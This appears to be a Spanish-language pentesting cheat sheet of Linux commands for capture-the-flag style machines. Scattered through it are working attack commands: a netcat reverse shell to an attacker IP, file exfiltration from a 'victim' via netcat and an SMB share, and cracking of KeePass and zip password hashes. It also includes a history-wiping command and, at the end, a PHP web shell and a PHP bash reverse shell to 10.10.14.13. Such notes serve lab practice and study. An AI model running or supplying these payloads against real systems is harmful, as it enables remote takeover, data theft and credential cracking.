# Comandos Linux


- **sudo** -> Te permite ejecutar un comando o funcion en la consola.
- **su (switch user)** -> Cambiar de usuario

Modo Vi en la consola 
**Esc** - Entras al modo Vi y puedes tener una mayor agilidad al momento de borrar comandos o moverte

- **/etc/hosts** Ruta para colocar dominios e IP's
- **/etc/passwd** Ruta de las cuentas de usuario
- **/etc/shadow** Ruta de hashes de passwrod de usuario estan almacenadas ahi
- **/etc/group** Ruta de configuracion del archivo de grupos
- **/etc/shells** Podemos ver las diferentes shells que hay 
- **/etc/ssh/sshd_config** Podemos ver las configuraciones de ssh y ver si el usuario root se puede conectar 

- /usr/share/Seclists/Web-Shells/FuzzDB/**nc.exe**    Netcat nos ayuda a conseguir una ReverShell

- Comando -> **watch -n 1 ls -l /bin/bash** Monitoreamos el comando /bin/bash y miramos con ls -l (l=ele)
- Comando -> **!$** Referencias el ultimo argumento que hayamos puesto en la consola 
- Comando -> **echo ‘’ > ~/.zsh_history** Para borrar el historial en la zshrc
- Comando -> **echo $PATH** Miramos el path de la consola Linux

- Comando -> **sudo openvpn < FILENAME.ovpn>** – Te conectas a una vpn especifica
- Comando -> **extractPorts < FILENAME>** (Sirve para mostrarte los puertos mas relevantes y copiarlos en el cli para uso instantaneo )
- Comando -> **Settarget < IP - NAME>** -Agregamos en la esquina derecha la IP y el nombre de la maquina (Es una funcion antes configurada en la zsh)
- Comando -> **mkt** – Crea 3 directorios ya establecidos (content, exploit, namp) propios de la configuracion de parroy antes hecha
- Comando -> **mkdir -p /PATH/** Creamos una ruta con muchos directorios 

- Comando -> **arp-scan -I ens33 --localnet** Escaneamos toda la red (l=i mayuscula)
- Comando -> **macchanger -l | grep -i < NAME_VENDOR>** Podemos ver los vendors y asi determinar que es (l=ele)
- Comando -> **id** Identificador de los usuarios (UID), root=UID=0
- Comando -> **lsb_release -a** Nos proporciona informacion de que Linux es 
- Comando -> **whoami** Nos muestra el usuario que somos
- Comando -> **hostname -I** Miramos nuestra interface (I=i mayuscula)
- Comando -> **uname -a** Enumeras la version del Kernel
- Comando -> **ps -faux** Listas los procesos que corren en la maquina Linux

- Comando -> **7z l file.zip** (l=ele) Podemos ver el contenido interno del archivo zip, gz, bzip2, etc...
- Comando -> **7z x file.gz** (l=ele) Podemos extraer el contenido interno del archivo zip, gz, bzip2, etc...

- Comando -> **cat < FileName> | wc -l** Te muestra el numero de palabras en fila que existen en ese archivo (l=ele)
- Comando -> **exiftool <Image.jpg>** Con esa herramienta podemos ver los metadatos de una imagen 
- Comando -> **steghide info <Image.jpg>** Para ver si la imagen tiene contenido oculto
-  Comando -> **steghide extract -sf <Image.jpg>** Para ver si la imagen tiene contenido oculto (sf=sourcefile)

- Comando -> **find / -name < WORD> 2>/dev/null** Para encontrar el directorio y los permisos denegados no nos los muestre
- Comando -> **file < FILE>** Nos muestra que tipo de archivo es por los magic numbers

- Comando -> **ifconfig** o **ip a** – Miras la tarjeta de red (ens33 ‘IP Local’ , Tun0 ‘IP VPN’)

- Comando -> **ls bin/** Para ver que comandos podemos ejecutar 

- Comando -> **ping -c 1 < TARGET IP>** Mandamos un numero de ping especifico
- Comando -> **ping -c 1 < TARGET IP> -R** Verificar si tenemos conexion a una IP mandando numeros de ping especificos (R=traceroute, solo aplica en maquinas Linux, c=numero de ping) (ttl=64 Linux, ttl=128 Windows )

- Comando -> **tcpdump -i < INTERFACE> icmp -n** (n=no resolucion DNS) Nos ponemos en escucha para trazas icmp y recibir los pings

- Server Comando -> **nc.exe -e cmd < NUESTRA IP> < PUERTO>** Para ejecutar el netcat y nos haga una ReverShell a nuestra IP y puerto especifico
- Comando -> **rlwrap nc -nlvp 443** Nos ponemos en escucha por el puerto 443 (Podemos hacer **Ctrl + l**, sin poder hacer **Ctrl + c**) maquinas Windows
- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux

- Comando -> **nc < Nuestra IP> 443 < secret.zip** Nos ponemos en escucha por el puerto 443, maquinas Linux, para mandar un archivo por netcat a nuestra direccion IP, esto desde la maquina victima
- Comando -> **nc -nlvp 443 > secret.zip** Nos ponemos en escucha por el puerto 443, maquinas Linux esto en la maquina de atacante para recibir el archivo y colocarlo con la misma extencion y el mismo nombre.

- Comando -> **smbserver.py < FOLDERNAME> $(pwd)** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
- Comando -> **impacket-server < FOLDERNAME> $(pwd) -smb2support** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
	- **\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443** Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443 (Se coloca en la maquina victima)
	- **copy CEH.kdbx \\\\10.10.14.17\\smbFolder\\CEH.kdbx** Copiamos un archivo de la maquina victima a nuestra maquina de atacante
		- CEH.kdbx -> Nombre dek archivo que nos queremos copiar de la maquina victima
		- 10.10.14.17 -> Nuestra direccion IP
		- smbFolder -> Nombre de la carpeta del recurso compartido 


- Comando -> **chown <USER:USER> -R < DIR PATH>** Le cambiamos el propietario a un directorio (R=Forma recursiva)
- Comando -> **chmod u+x < FILE>** Le cambiamos los permisos a un archivo (r=read, w=write, x=execution, u=user, g=grupo, o=other)

- Encontrar un archivo con extencion **.kdbx** 
	Son archivos de datos creados por KeePass 'Password Safe', se refieren a la passwd de base de datos KeePass
	- **keepassxc FILE.kdbx** Nos permite abrir un archivo keepass con passwd, de lo contrario hacemos lo siguiente
	- **keepass2john FILE.kdbx > hash** Si no sabemos la passwd, esto no sayuda a extraer un hash para poder hacer fuerza bruta, guardandolo en un archivo llamado hash 

- Comando -> **cewl -w < FileName.txt> <http://URL/>** Creas un diccionario mas 'personalizado' con las palabras de una webpage y te regresa un archivo de texto

- Comando -> **upx < FILE>** Podemos bajarle el peso al archivo 

- Comando -> **find / -name < NAME> 2>/dev/null** Para encontrar el directorio y los permiso denegados no nos los muestre

- Comando -> **zip2john secret.zip > hash** Para que nos devielva el Hash y asi despues poderlo crackear y el resultado del hash lo metemos a un archivo llamado 'hash'.
- Comando -> **john -w:/usr/share/wordlists/rockyou.txt hash** Aplicamos un ataque de fuerza bruta a un archivo hash

- Comando -> **john --wordlist=</usr/share/wordlists/rockyou.txt> < HASHFILE> --format=< HASHTYPE>** Aplicamos un ataque de fuerza bruta a un archivo hash (raw-md5, sha256)
- Comando -> **fcrackzip -p /usr/share/wordlists/rockyou.txt -b -u FILE.zip -D** Nos crackea el hash y nos proporciona la passwd (p=init-passwd-string, b=bruteforce, D=dicctionary, u=use-unzip) 


----
Codigo PHP para que en la url nosotros podamos ejecutar diferentes comandos **/image.php?cmd=whoami**
Despues del primer ? va php esto en los tres de abajo
<?
	system($_REQUEST['cmd']);
?>

Comando de ReverShell en PHP
<?
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
?>
